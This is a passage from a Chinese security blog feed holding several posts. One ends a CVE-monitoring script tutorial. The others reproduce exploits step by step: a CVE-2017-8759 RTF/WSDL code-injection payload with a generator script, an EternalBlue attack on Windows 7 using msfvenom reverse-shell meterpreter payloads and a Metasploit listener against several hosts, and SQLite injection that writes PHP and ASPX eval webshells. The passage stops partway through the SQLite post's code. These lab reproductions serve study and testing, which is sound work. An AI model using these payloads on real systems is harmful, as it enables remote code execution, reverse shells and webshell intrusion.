<p>从上面两张图片可以看到有三十多个，但我们有时候并不是都需要看。我们可以根据Description中关键信息来进行过滤，仅仅将我们需要关注的CVE信息发送到邮箱或进行入库操作。<br>如下图为获取<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-8295" target="_blank" rel="noopener">CVE-2017-8295</a>的信息。<br><img src="/2017/12/11/NEW-CVE-Monitor/添加关键字匹配.jpg" alt="添加关键字匹配"><br>然后修改main方法，根据是否有关注的CVE信息来决定邮件的内容。<br>这里先用本地服务器为例，新建today.html文件，其中包含<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-9805" target="_blank" rel="noopener">CVE-2017-9805</a>和<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-16241" target="_blank" rel="noopener">CVE-2017-16241</a>。<br><img src="/2017/12/11/NEW-CVE-Monitor/关键字匹配.jpg" alt="关键字匹配"><br>运行代码结果打印了一条包含了我们的关键字的数据。<br>邮件中的内容如下所示：<br><img src="/2017/12/11/NEW-CVE-Monitor/关键字匹配邮件内容.jpg" alt="关键字匹配邮件内容"><br>这样就能过滤其他CVE信息，仅仅记录我们关注的内容了。</p>
<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>本文主要用到了BeautifulSoup解析网页和mongodb数据库的使用，然后就可以将想要的内容保存到数据库中。脚本并不限于在此处使用，也可以修改一下抓取其他网站内容。<br>代码地址：<a href="https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py</a><br>查询的功能就不做了，若想实现其他功能，可以自行增加和修改。</p>
<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p>[1]<a href="https://xianzhi.aliyun.com/forum/topic/1694/" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/1694/</a><br>[2]<a href="http://blog.csdn.net/guoxingege/article/details/47339885" target="_blank" rel="noopener">http://blog.csdn.net/guoxingege/article/details/47339885</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之美 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-Monitor </tag>
            
            <tag> Mongodb数据库 </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[.NET框架0Day漏洞CVE-2017-8759复现过程]]></title>
      <url>/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/</url>
      <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">FireEye</a>最近检测到一个恶意的Microsoft Office RTF文档，利用<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759" target="_blank" rel="noopener">CVE-2017-8759</a>（一种SOAP WSDL解析器代码注入漏洞）。此漏洞允许在解析SOAP WSDL定义内容期间注入任意代码。<br><a id="more"></a></p>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞名称：.NET Framework远程代码执行漏洞<br>漏洞编号：CVE-2017-8759<br>漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统<br>利用场景：远程钓鱼、社会工程<br>影响版本：以下.NET版本<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.2<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5.1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.7<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.5.2<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 2.0 SP2<br>影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint</p>
<h1 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h1><p>PrintClientProxy方法中的WSDL解析器模块中存在代码注入漏洞。如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。这就造成了攻击者注入和执行任意代码。</p>
<p>这里不详细介绍了（因为我也不懂），可以参考火眼和360的分析。</p>
<p><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/本地测试.jpg" alt="本地测试"></p>
<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>新建一个图片文件，名字为office.png（其他格式也行），内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">definitions</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/soap/"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:suds</span>=<span class="string">"http://www.w3.org/2000/wsdl/suds"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tns</span>=<span class="string">"http://schemas.microsoft.com/clr/ns/System"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ns0</span>=<span class="string">"http://schemas.microsoft.com/clr/nsassem/Logo/Logo"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">portType</span> <span class="attr">name</span>=<span class="string">"PortType"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">binding</span> <span class="attr">name</span>=<span class="string">"Binding"</span> <span class="attr">type</span>=<span class="string">"tns:PortType"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">style</span>=<span class="string">"rpc"</span> <span class="attr">transport</span>=<span class="string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">suds:class</span> <span class="attr">type</span>=<span class="string">"ns0:Image"</span> <span class="attr">rootType</span>=<span class="string">"MarshalByRefObject"</span>&gt;</span><span class="tag">&lt;/<span class="name">suds:class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">"Service"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span> <span class="attr">name</span>=<span class="string">"Port"</span> <span class="attr">binding</span>=<span class="string">"tns:Binding"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://localhost?C:\Windows\System32\calc.exe?011"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">";</span></span></span><br><span class="line"><span class="tag"><span class="string">			if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">				System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);</span></span></span><br><span class="line"><span class="tag"><span class="string">				System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);</span></span></span><br><span class="line"><span class="tag"><span class="string">			&#125; //"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后放在web目录。<br>根据样本文件，发现是在word文档中添加一个SOAP标记。<br>格式为<code>soap:wsdl=http://192.168.135.135/office/office.png</code><br>本次以样本为例，然后修改其中的地址。<br><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/样本文件.jpg" alt="样本文件"></p>
<p>分别用样本和自己的web地址生成特hex格式的地址，然后将样本中的地址更换为自己的地址即可。（注意替换的长度需保持一致）</p>
<p><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/生成hex格式的地址.jpg" alt="生成hex格式的地址"></p>
<p>样本文件最重要的是倒数第三行（看起来是空白），然后可以将上面无用的内容全部删除，只留下最后三行。</p>
<p><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/替换地址后的内容.jpg" alt="替换地址后的内容"></p>
<p>然后就是打开该word文档，就可以看到计算器弹出。但实现的过程有点问题，就是必须点更新链接才会触发（即使将添加objupdate还是不行）。</p>
<p><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/执行效果.gif" alt="执行效果"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>参考<a href="https://github.com/vysec/CVE-2017-8759" target="_blank" rel="noopener">https://github.com/vysec/CVE-2017-8759</a><br>新建o.png，内容为：</p>
<p><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/o.png内容.jpg" alt="o.png内容"></p>
<p>word.db内容：<br><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/word.db内容.jpg" alt="word.db内容"></p>
<p>新建一个rtf文档，随意插入一个对象。例如<a href="http://192.168.135.135/office/o.png" target="_blank" rel="noopener">http://192.168.135.135/office/o.png</a> (这是为了下面替换objdata内容)<br>用记事本打开，将<code>\object\objautlink\rsltpict</code>修改为<code>\object\objautlink\objupdate\rsltpict</code><br>打开blob.bin文件</p>
<p><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/blob.bin源文件.jpg" alt="blob.bin源文件"><br>将其中的地址修改为<a href="http://192.168.135.135/office/o.png" target="_blank" rel="noopener">http://192.168.135.135/office/o.png</a><br>复制原来的地址，尽量多复制点空格。<br><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/替换过程1.jpg" alt="替换过程1"></p>
<p>然后生成新的hex地址<br><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/生成新的地址.jpg" alt="生成新的地址"></p>
<p>然后用生成的地址替换blob.bin中的地址<br><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/替换后的blob.bin文件.jpg" alt="替换后的blob.bin文件"><br>然后将blob.bin中的内容替换word文档的objdata内容。<br>然后打开word文档，就会有神奇的事情发生。<br><img src="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/执行效果2.gif" alt="执行效果2"></p>
<p>恶意软件将被放置在<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\OfficeUpdte-KB[6个随机数字].exe</code></p>
<blockquote>
<p>以上均在虚拟机上测试。没有使用样本中的left.jpg。最后结果确实如火眼所说的那样生成了OfficeUpdte-KB******.exe文件。在win10(真机)上测试的时候还生成了http1001924168413541350office0office4png.pdb、http1001924168413541350office0office4png.dll和Logo.cs三个文件。<br>这里方法一没有直接执行的原因我也不太清楚，但是用方法二插入office.png，也是不会直接执行的。如果方法一和二中过程替换一下，效果也是一样的。</p>
</blockquote>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>下载脚本<a href="https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py</a></p>
<p>使用方法：<code>python CVE-2017-8759_exploit_rtf.py http://192.168.135.135/office/office.png</code><br>会在当前目录生成文件cve-2017-8759.rtf，打开即可。</p>
<blockquote>
<p>根据CVE-2017-0199的脚本改写而来，仅仅保留并修改了生成文件的代码。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1].<a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a><br>[2].<a href="http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA</a><br>[3].<a href="https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-8759 </tag>
            
            <tag> .NET Framework </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹]]></title>
      <url>/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">Sleepya
</a>的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。<br><a id="more"></a></p>
<p>靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。<br>脚本下载地址：<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a></p>
<h3 id="漏洞利用测试"><a href="#漏洞利用测试" class="headerlink" title="漏洞利用测试"></a>漏洞利用测试</h3><h4 id="1-安装NASM"><a href="#1-安装NASM" class="headerlink" title="1.安装NASM"></a>1.安装NASM</h4><p>下载地址：<a href="http://www.nasm.us/pub/nasm/releasebuilds/" target="_blank" rel="noopener">http://www.nasm.us/pub/nasm/releasebuilds/</a> ，我这里用的是<a href="http://www.nasm.us/pub/nasm/releasebuilds/2.13.01/win64/nasm-2.13.01-installer-x64.exe" target="_blank" rel="noopener">2.13</a>。<br>然后开始安装。</p>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/安装NASM.jpg" alt="安装NASM"></p>
<p>安装完成后加入环境变量。</p>
<h4 id="2-下载利用脚本，并编译内核shellcode"><a href="#2-下载利用脚本，并编译内核shellcode" class="headerlink" title="2.下载利用脚本，并编译内核shellcode"></a>2.下载利用脚本，并编译内核shellcode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</span><br></pre></td></tr></table></figure>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/下载脚本.jpg" alt="下载脚本"></p>
<p>编译内核shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> MS17-010/shellcode/</span><br><span class="line">nasm <span class="_">-f</span> bin eternalblue_kshellcode_x64.asm</span><br><span class="line">nasm <span class="_">-f</span> bin eternalblue_kshellcode_x86.asm</span><br></pre></td></tr></table></figure>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/编译ASM文件.jpg" alt="编译ASM文件"></p>
<h4 id="3-生成反弹exp"><a href="#3-生成反弹exp" class="headerlink" title="3.生成反弹exp"></a>3.生成反弹exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 <span class="_">-f</span> raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 <span class="_">-f</span> raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin</span><br></pre></td></tr></table></figure>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/生成反弹exp.jpg" alt="生成反弹exp"></p>
<h4 id="4-合并SHELLCODE"><a href="#4-合并SHELLCODE" class="headerlink" title="4.合并SHELLCODE"></a>4.合并SHELLCODE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bin</span><br><span class="line">cat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.bin</span><br><span class="line">python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin</span><br></pre></td></tr></table></figure>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/合并SHELLCODE.jpg" alt="合并SHELLCODE"></p>
<h4 id="5-开启Metasploit并监听"><a href="#5-开启Metasploit并监听" class="headerlink" title="5.开启Metasploit并监听"></a>5.开启Metasploit并监听</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> EXITFUNC thread</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.217.1</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">...</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4445</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/开启监听.jpg" alt="开启监听"></p>
<h4 id="6-进行攻击"><a href="#6-进行攻击" class="headerlink" title="6.进行攻击"></a>6.进行攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</span><br></pre></td></tr></table></figure>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/利用生成的脚本攻击.jpg" alt="利用生成的脚本攻击"></p>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/攻击结果.jpg" alt="攻击结果"><br>看到已经获取Meterpreter反弹。</p>
<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>在PentestBox中运行一些命令时(如msfconsole)，提示<code>不是内部或外部命令，也不是可运行的程序或批处理文件。</code><br>解决方法：输入<code>cmd</code>之后再输入需要执行的命令。<br><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/问题1.jpg" alt="问题1"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。<br>2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。<br>3.在使用中设置了线程，可以同时对多个系统进行攻击测试。<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.134 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.135 shellcode\sc_all.bin</span><br><span class="line">python eternalblue_exploit7.py 192.168.131.136 shellcode\sc_all.bin</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/多个攻击.jpg" alt="多个攻击"><br>攻击结果：<br><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/多个攻击结果.jpg" alt="多个攻击结果"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener">https://github.com/worawit/MS17-010</a><br>[2]<a href="https://www.exploit-db.com/docs/42280.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/42280.pdf</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MS17-010 </tag>
            
            <tag> PentestBox </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLite手工注入Getshell技巧]]></title>
      <url>/2017/07/19/SQLite-Injection-Get-WebShell/</url>
      <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p><a href="http://www.sqlite.org/" target="_blank" rel="noopener">SQLite</a>是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。<br>之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。<br>首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。</p>
<a id="more"></a>
<h3 id="0x02-SQLite的使用"><a href="#0x02-SQLite的使用" class="headerlink" title="0x02 SQLite的使用"></a>0x02 SQLite的使用</h3><p>SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问  <a href="http://www.sqlite.org/download.html" target="_blank" rel="noopener">SQLite下载页面</a>，从 Windows 区下载预编译的二进制文件。现在最新的为<a href="http://www.sqlite.org/2017/sqlite-tools-win32-x86-3190300.zip" target="_blank" rel="noopener">sqlite-tools-win32-x86-3190300.zip</a>，下载下来后解压。我这里将其中的文件复制到<code>D:\sqlite</code>目录。</p>
<p>SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。</p>
<p>创建使用命令：<code>sqlite3.exe 数据库文件名</code>。例如创建一个名字为aa.db的数据库，使用命令：<code>sqlite3.exe aa.db</code>。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/创建数据库.jpg" alt="创建数据库"></p>
<p>附加数据库的基本语法是：<code>ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;</code>。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：<code>attach database &#39;d:\\sqlite\\bb.db&#39; as &#39;a&#39;;</code>。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/附加数据库.jpg" alt="附加数据库"></p>
<p>创建表并插入数据的命令如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a.tt(dataz <span class="built_in">text</span>); <span class="keyword">INSERT</span> <span class="keyword">into</span> a.tt(dataz) <span class="keyword">VALUES</span> (<span class="string">'test'</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/创建表查询.jpg" alt="创建表查询"></p>
<p>SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：<code>&lt;?php phpinfo();?&gt;</code>。</p>
<p>具体命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt;ATTACH DATABASE <span class="string">'d:\\sqlite\\23.php'</span> AS <span class="built_in">test</span> ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES (<span class="string">'&lt;?php phpinfo();?&gt;'</span>);--</span><br></pre></td></tr></table></figure>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/生成数据库格式为PHP.jpg" alt="生成数据库格式为PHP"></p>
<p>将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/PHP解析.jpg" alt="PHP解析"></p>
<p>同样的方法生成aspx后缀的数据库文件，创建表，并插入<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/ASPX格式数据库.jpg" alt="ASPX格式数据库"></p>
<p>通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。</p>
<h3 id="0x03-本地环境搭建及获取SHELL"><a href="#0x03-本地环境搭建及获取SHELL" class="headerlink" title="0x03 本地环境搭建及获取SHELL"></a>0x03 本地环境搭建及获取SHELL</h3><p>因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。</p>
<h4 id="1-环境搭建和项目的部署"><a href="#1-环境搭建和项目的部署" class="headerlink" title="1.环境搭建和项目的部署"></a>1.环境搭建和项目的部署</h4><p>下载安装 <a href="https://sourceforge.net/projects/sqlite-dotnet2/" target="_blank" rel="noopener">Sqlite ADO.NET</a>，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。</p>
<p>这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。</p>
<p>其目录结构如图：</p>
<p><img src="/2017/07/19/SQLite-Injection-Get-WebShell/项目目录结构.jpg" alt="项目目录结构"></p>
<p>Default.aspx是显示页面，其中有一个文本框和按钮。主要代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:TextBox</span> <span class="attr">ID</span>=<span class="string">"TextBox1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:TextBox</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:Button</span> <span class="attr">ID</span>=<span class="string">"Button1"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span 